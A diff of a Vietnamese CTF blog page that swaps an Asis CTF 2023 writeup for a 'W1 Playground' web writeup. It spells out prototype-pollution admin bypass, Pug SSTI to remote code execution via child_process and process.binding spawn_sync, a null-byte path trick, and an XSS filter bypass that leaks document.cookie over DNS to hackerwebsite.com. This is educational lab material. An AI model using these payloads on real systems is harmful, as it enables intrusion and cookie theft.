@@ -30,24 +30,24 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="Asis CTF 2023 Writeup" />
+<meta property="og:title" content="W1 Playground Writeup" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Asis-CTF-2023-Writeup Bài 1 hello: Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn đọc được flag thì phải đọc được file next.txt Đọc đề, đề gợi ý cho mình đọc manpage của curl Sau khi đọc và phân tích manpage mình đã nhận ra cách làm của bài này dựa vào chức năng bên dưới Đây là payload của mình ?x=f[a-i]le:///ne[b-x]t.txt Khi bypass được đoạn đầu tiên nó sẽ hiện ra 1 đường dẫn mới Theo đường dẫn, đi tới đoạn thứ 2 Decode Base64 ra để lấy nội dung Chắc chắn /app/index.js là source nên mình đã đọc nó Decode tiếp thì ra source code Code này đại khái là cũng như cái đầu bắt mình đọc file /next.txt nhưng lại cấm chữ next Sau khi phân tích code nhận ra lỗi ở 2 chổ này path.basename(fpath) sẽ trả lại cái tên file về cho mình còn fs.readFileSync(fpath) sẽ đọc file của fpath Sau một số thử nghiệm thì đây là payload cuối cùng của mình /next.txt%00/yuu.txt Decode Decode Flag: ASIS{good_job_bun}" />
-<meta property="og:description" content="Asis-CTF-2023-Writeup Bài 1 hello: Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn đọc được flag thì phải đọc được file next.txt Đọc đề, đề gợi ý cho mình đọc manpage của curl Sau khi đọc và phân tích manpage mình đã nhận ra cách làm của bài này dựa vào chức năng bên dưới Đây là payload của mình ?x=f[a-i]le:///ne[b-x]t.txt Khi bypass được đoạn đầu tiên nó sẽ hiện ra 1 đường dẫn mới Theo đường dẫn, đi tới đoạn thứ 2 Decode Base64 ra để lấy nội dung Chắc chắn /app/index.js là source nên mình đã đọc nó Decode tiếp thì ra source code Code này đại khái là cũng như cái đầu bắt mình đọc file /next.txt nhưng lại cấm chữ next Sau khi phân tích code nhận ra lỗi ở 2 chổ này path.basename(fpath) sẽ trả lại cái tên file về cho mình còn fs.readFileSync(fpath) sẽ đọc file của fpath Sau một số thử nghiệm thì đây là payload cuối cùng của mình /next.txt%00/yuu.txt Decode Decode Flag: ASIS{good_job_bun}" />
-<link rel="canonical" href="http://localhost:4000/posts/AsisCTF/" />
-<meta property="og:url" content="http://localhost:4000/posts/AsisCTF/" />
+<meta name="description" content="Bài 1: easy login Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin” Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập Chức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkey Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[&quot;__proto__&quot;][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đó Payload Có jwtkey rồi thì vào admin để lấy flag thôi Flag : W1{REDACTED} Bài 2: render4free Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta - global.replace_bad_char = str_to_replace =&gt; str_to_replace Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval - global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace) Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào Payload require(&#39;child_process&#39;).exec(&#39;ping hacked.sv&#39;) Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;ls&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Ngon vậy là có thể thực hiện lệnh ls Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag Payload: 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;/read_flag&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Flag: W1{REDACTED} Bài 3: Super sanitizer Tóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của user Blacklist của bài này như sau &lt;imgoner=&#39;\&quot;&#39;&gt; Lỗi của bài này nằm ở đây Khi chúng ta cho 1 ký tự có độ dài là 0x300 thì raw_str[0x300] sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là \x00 từ đó blacklist sẽ trở thành rỗng -&gt; bypass filter Nhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơn Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng window.location.href=hackerwebsite.com vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ flag.hackerwebsite.com) Nhưng leak kiểu gì? Mình đã thử leak kiểu btoa(document.cookie)+&quot;.hackerwebsite.com&quot; nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là document.cookie.charCodeAt(0-&gt;document.cookie.length-1) để leak ra từng ký tự của flag sang mã ascii Payload các bạn tự craft nhé Flag: W1{REACTED}" />
+<meta property="og:description" content="Bài 1: easy login Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin” Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập Chức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkey Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[&quot;__proto__&quot;][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đó Payload Có jwtkey rồi thì vào admin để lấy flag thôi Flag : W1{REDACTED} Bài 2: render4free Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta - global.replace_bad_char = str_to_replace =&gt; str_to_replace Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval - global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace) Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào Payload require(&#39;child_process&#39;).exec(&#39;ping hacked.sv&#39;) Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;ls&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Ngon vậy là có thể thực hiện lệnh ls Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag Payload: 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;/read_flag&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Flag: W1{REDACTED} Bài 3: Super sanitizer Tóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của user Blacklist của bài này như sau &lt;imgoner=&#39;\&quot;&#39;&gt; Lỗi của bài này nằm ở đây Khi chúng ta cho 1 ký tự có độ dài là 0x300 thì raw_str[0x300] sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là \x00 từ đó blacklist sẽ trở thành rỗng -&gt; bypass filter Nhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơn Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng window.location.href=hackerwebsite.com vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ flag.hackerwebsite.com) Nhưng leak kiểu gì? Mình đã thử leak kiểu btoa(document.cookie)+&quot;.hackerwebsite.com&quot; nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là document.cookie.charCodeAt(0-&gt;document.cookie.length-1) để leak ra từng ký tự của flag sang mã ascii Payload các bạn tự craft nhé Flag: W1{REACTED}" />
+<link rel="canonical" href="http://localhost:4000/posts/W1Playground/" />
+<meta property="og:url" content="http://localhost:4000/posts/W1Playground/" />
 <meta property="og:site_name" content="Yuu’s blog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2023-09-24T23:00:00+07:00" />
+<meta property="article:published_time" content="2024-04-30T23:00:00+07:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Asis CTF 2023 Writeup" />
+<meta property="twitter:title" content="W1 Playground Writeup" />
 <meta name="twitter:site" content="@anzuukino" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-09-24T23:00:00+07:00","datePublished":"2023-09-24T23:00:00+07:00","description":"Asis-CTF-2023-Writeup Bài 1 hello: Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn đọc được flag thì phải đọc được file next.txt Đọc đề, đề gợi ý cho mình đọc manpage của curl Sau khi đọc và phân tích manpage mình đã nhận ra cách làm của bài này dựa vào chức năng bên dưới Đây là payload của mình ?x=f[a-i]le:///ne[b-x]t.txt Khi bypass được đoạn đầu tiên nó sẽ hiện ra 1 đường dẫn mới Theo đường dẫn, đi tới đoạn thứ 2 Decode Base64 ra để lấy nội dung Chắc chắn /app/index.js là source nên mình đã đọc nó Decode tiếp thì ra source code Code này đại khái là cũng như cái đầu bắt mình đọc file /next.txt nhưng lại cấm chữ next Sau khi phân tích code nhận ra lỗi ở 2 chổ này path.basename(fpath) sẽ trả lại cái tên file về cho mình còn fs.readFileSync(fpath) sẽ đọc file của fpath Sau một số thử nghiệm thì đây là payload cuối cùng của mình /next.txt%00/yuu.txt Decode Decode Flag: ASIS{good_job_bun}","headline":"Asis CTF 2023 Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/AsisCTF/"},"url":"http://localhost:4000/posts/AsisCTF/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-08-21T00:23:44+07:00","datePublished":"2024-04-30T23:00:00+07:00","description":"Bài 1: easy login Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin” Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập Chức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkey Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[&quot;__proto__&quot;][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đó Payload Có jwtkey rồi thì vào admin để lấy flag thôi Flag : W1{REDACTED} Bài 2: render4free Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta - global.replace_bad_char = str_to_replace =&gt; str_to_replace Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval - global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace) Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào Payload require(&#39;child_process&#39;).exec(&#39;ping hacked.sv&#39;) Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;ls&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Ngon vậy là có thể thực hiện lệnh ls Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag Payload: 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;/read_flag&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Flag: W1{REDACTED} Bài 3: Super sanitizer Tóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của user Blacklist của bài này như sau &lt;imgoner=&#39;\\&quot;&#39;&gt; Lỗi của bài này nằm ở đây Khi chúng ta cho 1 ký tự có độ dài là 0x300 thì raw_str[0x300] sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là \\x00 từ đó blacklist sẽ trở thành rỗng -&gt; bypass filter Nhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơn Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng window.location.href=hackerwebsite.com vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ flag.hackerwebsite.com) Nhưng leak kiểu gì? Mình đã thử leak kiểu btoa(document.cookie)+&quot;.hackerwebsite.com&quot; nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là document.cookie.charCodeAt(0-&gt;document.cookie.length-1) để leak ra từng ký tự của flag sang mã ascii Payload các bạn tự craft nhé Flag: W1{REACTED}","headline":"W1 Playground Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/W1Playground/"},"url":"http://localhost:4000/posts/W1Playground/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>Asis CTF 2023 Writeup | Yuu's blog
+  <title>W1 Playground Writeup | Yuu's blog
   </title>
 
   <!--
@@ -468,7 +468,7 @@
         
           
             
-              <span>Asis CTF 2023 Writeup</span>
+              <span>W1 Playground Writeup</span>
             
 
           
@@ -1299,6 +1299,321 @@
     <!-- combine -->
     
   
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
 
   
 
@@ -1316,6 +1631,49 @@
   
   
 
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
   
 
   
@@ -1343,7 +1701,7 @@
 
 <article class="px-1">
   <header>
-    <h1 data-toc-skip>Asis CTF 2023 Writeup</h1>
+    <h1 data-toc-skip>W1 Playground Writeup</h1>
     
 
     <div class="post-meta text-muted">
@@ -1360,18 +1718,41 @@
 
 <time
   
-  data-ts="1695571200"
+  data-ts="1714492800"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Sep 24, 2023
+  Apr 30, 2024
 </time>
 
       </span>
 
       <!-- lastmod date -->
+      
+        <span>
+          Updated
+          <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1724174624"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Aug 21, 2024
+</time>
+
+        </span>
       
 
       
@@ -1415,9 +1796,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="200 words"
+  title="656 words"
 >
-  <em>1 min</em> read</span>
+  <em>3 min</em> read</span>
 
         </div>
       </div>
@@ -1425,85 +1806,136 @@
   </header>
 
   <div class="content">
-    <h1 id="asis-ctf-2023-writeup">Asis-CTF-2023-Writeup</h1>
-<h1 id="bài-1-hello">Bài 1 hello:</h1>
-<ul>
-  <li>Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn đọc được flag thì phải đọc được file next.txt</li>
-  <li>Đọc đề, đề gợi ý cho mình đọc manpage của curl</li>
-</ul>
+    <h2 id="bài-1-easy-login"><span class="me-2">Bài 1: easy login</span><a href="#bài-1-easy-login" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/f841f62b-3ad7-4662-94f6-ceafb5a18d94" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/f841f62b-3ad7-4662-94f6-ceafb5a18d94" alt="image" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/paDR37b.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/paDR37b.png" alt="image" loading="lazy"></a></p>
 
-<ul>
-  <li>Sau khi đọc và phân tích manpage mình đã nhận ra cách làm của bài này dựa vào chức năng bên dưới</li>
-</ul>
+<p>Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”</p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/b8b6d5b9-a957-4aed-bc3e-77bf65a086b0" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/b8b6d5b9-a957-4aed-bc3e-77bf65a086b0" alt="image" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/ljSahfY.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/ljSahfY.png" alt="image" loading="lazy"></a></p>
 
-<ul>
-  <li>Đây là payload của mình <strong>?x=f[a-i]le:///ne[b-x]t.txt</strong></li>
-</ul>
+<p><a href="https://i.imgur.com/mr7eats.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/mr7eats.png" alt="image" loading="lazy"></a></p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/9c98041d-048d-42f0-ac4a-15c4f759912e" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/9c98041d-048d-42f0-ac4a-15c4f759912e" alt="image" loading="lazy"></a></p>
+<p>Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập
+Chức năng admin kiểm tra xem chúng ta có phải admin không qua <code class="language-plaintext highlighter-rouge">isAdmin=true</code> sau khi phân tích jwtkey
+Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm <code class="language-plaintext highlighter-rouge">logindata["__proto__"][isAdmin]=true</code> vào thì prototype của <code class="language-plaintext highlighter-rouge">logindata</code> sẽ có thuộc tính <code class="language-plaintext highlighter-rouge">isAdmin=true</code> từ đó logindata sẽ kế thừa thuộc tính đó
+Payload</p>
 
-<ul>
-  <li>Khi bypass được đoạn đầu tiên nó sẽ hiện ra 1 đường dẫn mới</li>
-</ul>
+<p><a href="https://i.imgur.com/t62zoI3.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/t62zoI3.png" alt="image" loading="lazy"></a></p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/276a0b74-7901-4236-bf3c-d4634e05b367" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/276a0b74-7901-4236-bf3c-d4634e05b367" alt="image" loading="lazy"></a></p>
+<p>Có jwtkey rồi thì vào admin để lấy flag thôi</p>
 
-<ul>
-  <li>Theo đường dẫn, đi tới đoạn thứ 2</li>
-</ul>
+<p><a href="https://i.imgur.com/NdpGVoS.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/NdpGVoS.png" alt="image" loading="lazy"></a></p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/66c68c50-7386-4c95-a274-b9733b861540" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/66c68c50-7386-4c95-a274-b9733b861540" alt="image" loading="lazy"></a></p>
+<p><strong>Flag : W1{REDACTED}</strong></p>
 
-<ul>
-  <li>Decode Base64 ra để lấy nội dung</li>
-</ul>
+<h2 id="bài-2-render4free"><span class="me-2">Bài 2: render4free</span><a href="#bài-2-render4free" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/1ab620c1-0eea-4c27-b781-af9852891eba" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/1ab620c1-0eea-4c27-b781-af9852891eba" alt="image" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/KTMygHL.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/KTMygHL.png" alt="image" loading="lazy"></a></p>
 
-<ul>
-  <li>Chắc chắn <strong>/app/index.js</strong> là source nên mình đã đọc nó</li>
-</ul>
+<p>Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào
+Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI</p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/c0654e71-64ad-45e7-96fd-086780699664" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/c0654e71-64ad-45e7-96fd-086780699664" alt="image" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/SliIvxB.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/SliIvxB.png" alt="image" loading="lazy"></a></p>
 
-<ul>
-  <li>Decode tiếp thì ra source code</li>
-</ul>
+<p>Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js</p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2e2dadfd-6e9a-4d32-be6b-9181bbb4e01d" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2e2dadfd-6e9a-4d32-be6b-9181bbb4e01d" alt="image" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/5mAiiby.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/5mAiiby.png" alt="image" loading="lazy"></a></p>
 
-<ul>
-  <li>Code này đại khái là cũng như cái đầu bắt mình đọc file /next.txt nhưng lại cấm chữ next</li>
-  <li>Sau khi phân tích code nhận ra lỗi ở 2 chổ này</li>
-</ul>
+<p>Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta</p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/488f7401-67ca-4c4b-8acd-143df4f0a882" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/488f7401-67ca-4c4b-8acd-143df4f0a882" alt="image" loading="lazy"></a></p>
+<p><code class="language-plaintext highlighter-rouge">- global.replace_bad_char = str_to_replace =&gt; str_to_replace</code>
+Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval</p>
 
-<ul>
-  <li><strong>path.basename(fpath)</strong> sẽ trả lại cái tên file về cho mình còn <strong>fs.readFileSync(fpath)</strong> sẽ đọc file của fpath</li>
-  <li>Sau một số thử nghiệm thì đây là payload cuối cùng của mình <strong>/next.txt%00/yuu.txt</strong></li>
-</ul>
+<p><code class="language-plaintext highlighter-rouge">- global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace)</code>
+Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào
+Payload <code class="language-plaintext highlighter-rouge">require('child_process').exec('ping hacked.sv')</code>
+<a href="https://i.imgur.com/ACbksnM.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/ACbksnM.png" alt="image" loading="lazy"></a>
+Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import
+Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null</p>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/57450aac-3b6c-4115-b6aa-c26a18d00b11" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/57450aac-3b6c-4115-b6aa-c26a18d00b11" alt="image" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/2wwyD2a.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/2wwyD2a.png" alt="image" loading="lazy"></a></p>
 
-<ul>
-  <li>Decode</li>
-</ul>
+<p>Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs</p>
+<div class="language-js highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>  <span class="nx">process</span><span class="p">.</span><span class="nf">binding</span><span class="p">(</span><span class="dl">'</span><span class="s1">spawn_sync</span><span class="dl">'</span><span class="p">).</span><span class="nf">spawn</span><span class="p">({</span> 
